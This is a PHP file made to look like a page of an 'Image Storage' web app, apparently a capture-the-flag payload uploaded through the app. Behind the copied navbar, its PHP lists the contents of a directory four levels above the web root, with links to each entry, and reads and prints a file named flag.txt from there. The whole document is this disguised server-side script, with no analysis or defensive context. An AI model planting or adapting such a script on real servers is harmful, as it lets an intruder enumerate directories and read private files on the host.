<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
<title>Image Storage</title>
</head>
<body>
    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="../">Image Storage</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="../">Home</a></li>
            <li><a href="../list.php">List</a></li>
            <li><a href="../upload.php">Upload</a></li>
          </ul>

        </div><!--/.nav-collapse -->
      </div>
    </nav><br/><br/><br/>
    <div class="container"><ul>
    <?php
        $directory = '../../../../';
        $scanned_directory = scandir($directory);
        foreach ($scanned_directory as $key => $value) {
          echo "<li><a href='{$directory}{$value}'>".$value."</a></li><br/>";
        }
        $flag_path = '../../../../flag.txt';
        $flag = fopen($flag_path, 'r');
        while ($line = fgets($flag)) {
          echo($line)."<br>";
        }
        fclose($flag);
    ?> 
    </ul></div> 
</body>
</html>